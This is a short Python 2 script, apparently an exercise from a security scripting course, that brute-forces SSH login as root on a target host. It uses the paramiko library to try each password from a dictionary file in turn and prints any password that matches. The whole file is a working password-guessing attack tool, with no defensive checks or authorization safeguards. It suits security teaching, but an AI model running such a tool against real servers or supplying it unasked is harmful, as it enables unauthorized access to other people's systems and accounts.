#!/usr/bin/env python
import paramiko
import sys

# SPSE Module 7. Lesson 2. Exercise 1.
# SSH BruteForcer using paramiko!

def usage():
  print """paramiko_ssh_bruteforce.py Host dictionary_file
This script will try to bruteforce a SSH service using a dcitionary and the root userid"""

def get_passwd_list(dictionary):
  # Function to read the contents of a file and return it as a list (dictionary file)
  f_read = file(dictionary, 'r')
  passwd_list = f_read.readlines()
  return passwd_list

def bruteforce(host, dictionary):
  # Sets up initial values (username, password)
  user = 'root'
  passwd_list = get_passwd_list(dictionary)
  # Creates a "client" and loads the Keys for communicating 
  client = paramiko.SSHClient()
  client.load_system_host_keys()
  for passwd in passwd_list:  
    try :
      # Tries to connect using the passwords found in the list
      # If successful it will print the last passwrod tried and exit
      client.connect(host, username = user, password = passwd.replace('\n', ''))
      print '[+] Password matched!: %s' %(passwd.replace('\n', ''))
      return 1
    except paramiko.ssh_exception.AuthenticationException:
      # If there is an Authentication Exception (Bad password) It will print a notification
      print '[-] Failed Password: %s' %(passwd.replace('\n', ''))
    except Exception as e:
      print e
      # In any other case (timeout, server closed connection) it will restart the client and continue the procedure
      client = paramiko.SSHClient()
      client.load_system_host_keys()
    finally:
      # In either case it will close the connection at the end (very polite)
      client.close()

def main():
  if len(sys.argv) < 3:
    usage()
  else:
    host = sys.argv[1]
    dictionary = sys.argv[2]
    bruteforce(host, dictionary)

if __name__ == '__main__':
  main()
